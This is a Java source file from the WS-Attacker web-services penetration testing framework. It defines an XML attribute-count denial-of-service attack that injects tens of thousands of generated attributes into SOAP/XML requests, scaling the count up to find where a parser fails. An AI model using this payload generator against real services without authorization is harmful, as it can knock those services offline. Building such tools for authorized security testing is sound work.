/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Altmeier
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.intelligentdos.dos;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;

import wsattacker.library.intelligentdos.common.DoSParam;
import wsattacker.library.intelligentdos.helper.IterateModel;
import wsattacker.library.intelligentdos.helper.IterateModel.IncreaseIncrementStrategie;
import wsattacker.library.intelligentdos.helper.IterateModel.IterateStrategie;

/**
 * @author Christian Altmeier
 */
public class XmlAttributeCount
    extends AbstractDoSAttack
{

    private static final int MIN_NUMBER_OF_ATTRIBUTES = 2;

    final PayloadPosition[] possiblePossitions = { PayloadPosition.ELEMENT, PayloadPosition.ATTRIBUTE };

    // 3072 3145728
    private static final IterateModel defaultNumberOfAttributes =
        IterateModel.custom().startAt( 2500 ).stopAt( 160000 ).setIncrement( 4 ).setIterateStrategie( IterateStrategie.MUL ).setIncreaseIncrementStrategie( IncreaseIncrementStrategie.NO ).build();

    private static final String[] defaultNames = { "a" };

    private String[] names;

    // iterators
    private IterateModel numberOfAttributes;

    private Iterator<String> namesIterator;

    // current
    private int currentNumberOfAttributes;

    private String currentName;

    public XmlAttributeCount()
    {
        try
        {
            numberOfAttributes = defaultNumberOfAttributes.clone();
        }
        catch ( CloneNotSupportedException e )
        {
            LOG.warn( e );
        }

        names = defaultNames;
        namesIterator = Arrays.asList( names ).iterator();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getName()
     */
    @Override
    public String getName()
    {
        return "XmlAttributeCount";
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.AbstractDoSAttack#getPossiblePossitions()
     */
    @Override
    public PayloadPosition[] getPossiblePossitions()
    {
        PayloadPosition[] copy = new PayloadPosition[possiblePossitions.length];
        System.arraycopy( possiblePossitions, 0, copy, 0, possiblePossitions.length );
        return copy;
    }

    public IterateModel getNumberOfAttributesIterator()
    {
        return numberOfAttributes;
    }

    public void setNumberOfAttributesIterator( IterateModel iterateModel )
    {
        if ( iterateModel == null )
        {
            throw new IllegalArgumentException( "NumberOfAttributesIterator may not be null" );
        }

        numberOfAttributes = iterateModel;
    }

    public String[] getNames()
    {
        String[] copy = new String[names.length];
        System.arraycopy( names, 0, copy, 0, names.length );
        return copy;
    }

    public void setNames( String[] names )
    {
        if ( names == null || names.length == 0 )
        {
            throw new IllegalArgumentException( "elements may not be null" );
        }

        this.names = new String[names.length];
        System.arraycopy( names, 0, this.names, 0, names.length );
        this.namesIterator = Arrays.asList( names ).iterator();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#hasFurtherParams()
     */
    @Override
    public boolean hasFurtherParams()
    {
        return numberOfAttributes.hasNext() || namesIterator.hasNext();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#nextParam()
     */
    @Override
    public void nextParam()
    {
        if ( !initialized )
        {
            currentNumberOfAttributes = numberOfAttributes.next();
            currentName = namesIterator.next();

            initialized = true;
        }
        else if ( numberOfAttributes.hasNext() )
        {
            currentNumberOfAttributes = numberOfAttributes.next();
        }
        else if ( namesIterator.hasNext() )
        {
            numberOfAttributes.reset();
            currentNumberOfAttributes = numberOfAttributes.next();

            currentName = namesIterator.next();
        }
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getCurrentParams()
     */
    @Override
    public List<DoSParam<?>> getCurrentParams()
    {
        List<DoSParam<?>> list = new ArrayList<DoSParam<?>>();
        list.add( new DoSParam<Integer>( "Number of Attributes", currentNumberOfAttributes ) );
        list.add( new DoSParam<String>( "Name of Attributes", currentName ) );

        return list;
    }

    /*
     * (non-Javadoc)
     * @see
     * wsattacker.library.intelligentdos.dos.AbstractDoSAttack#getCommentLength(wsattacker.library.intelligentdos.dos
     * .DoSAttack.PayloadPosition)
     */
    @Override
    int getCommentLength( PayloadPosition payloadPosition )
    {

        int lengthNamespace = 0;
        if ( useNamespace )
        {
            lengthNamespace = namespace.length();
        }

        int length = 0;
        for ( int i = 0; i < currentNumberOfAttributes; i++ )
        {
            length += lengthNamespace + currentName.length() + 2 * String.valueOf( i ).length() + 4;
        }

        if ( payloadPosition == PayloadPosition.ELEMENT )
        {
            length += 17; // <attackElement />
        }

        return length;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getTamperedRequest(java.lang.String,
     * wsattacker.library.intelligentdos.dos.DoSAttack.PayloadPosition)
     */
    @Override
    public String getTamperedRequest( String xml, PayloadPosition payloadPosition )
    {
        verifyPayloadPosition( payloadPosition );

        String prefix = "";
        if ( useNamespace )
        {
            prefix = namespace;
        }

        // create payload string with currentNumberOfAttributes attributes
        StringBuilder sb = new StringBuilder();

        // create attribute string
        for ( int i = 0; i < currentNumberOfAttributes; i++ )
        {
            sb.append( prefix ).append( currentName ).append( i ).append( "=\"" ).append( i ).append( "\"" ).append( " " );
        }

        String tr;
        switch ( payloadPosition )
        {
            case ELEMENT:
                String tmp = "<attackElement " + sb.toString() + "/>";

                tr = payloadPosition.replacePlaceholder( xml, tmp );
                break;
            case ATTRIBUTE:
                tr = payloadPosition.replacePlaceholder( xml, sb.toString() );
                break;
            default:
                throw new IllegalArgumentException();
        }

        return tr;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#minimal()
     */
    @Override
    public DoSAttack minimal()
    {
        XmlAttributeCount xmlAttributeCount = new XmlAttributeCount();
        xmlAttributeCount.currentName = this.currentName;
        xmlAttributeCount.currentNumberOfAttributes = MIN_NUMBER_OF_ATTRIBUTES;

        return xmlAttributeCount;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#middle(wsattacker.library.intelligentdos.dos.DoSAttack)
     */
    @Override
    public DoSAttack middle( DoSAttack aThat )
    {
        if ( this == aThat )
        {
            XmlAttributeCount xmlAttributeCount = new XmlAttributeCount();
            xmlAttributeCount.currentName = this.currentName;
            xmlAttributeCount.currentNumberOfAttributes = this.currentNumberOfAttributes;
            return xmlAttributeCount;
        }

        if ( !aThat.getClass().equals( getClass() ) || !( aThat instanceof XmlAttributeCount ) )
        {
            throw new IllegalArgumentException( aThat.getClass() + " is not allowed!" );
        }

        XmlAttributeCount that = (XmlAttributeCount) aThat;

        XmlAttributeCount xmlAttributeCount = new XmlAttributeCount();
        xmlAttributeCount.currentName = this.currentName;
        if ( this.currentNumberOfAttributes == that.currentNumberOfAttributes )
        {
            xmlAttributeCount.currentNumberOfAttributes = this.currentNumberOfAttributes;
        }
        else
        {
            xmlAttributeCount.currentNumberOfAttributes =
                calculateMiddle( this.currentNumberOfAttributes, that.currentNumberOfAttributes );
        }

        return xmlAttributeCount;
    }

    @Override
    public void initialize()
    {
        super.initialize();

        numberOfAttributes.reset();
        ;
        namesIterator = Arrays.asList( names ).iterator();
    }

    /*
     * (non-Javadoc)
     * @see java.lang.Comparable#compareTo(java.lang.Object)
     */
    @Override
    public int compareTo( DoSAttack aThat )
    {
        // this optimization is usually worthwhile, and can
        // always be added
        if ( this == aThat )
            return EQUAL;

        if ( !aThat.getClass().equals( getClass() ) )
        {
            return EQUAL;
        }

        XmlAttributeCount that = (XmlAttributeCount) aThat;

        if ( this.currentNumberOfAttributes < that.currentNumberOfAttributes )
            return BEFORE;
        if ( this.currentNumberOfAttributes > that.currentNumberOfAttributes )
            return AFTER;

        return currentName.compareTo( that.currentName );
    }

}
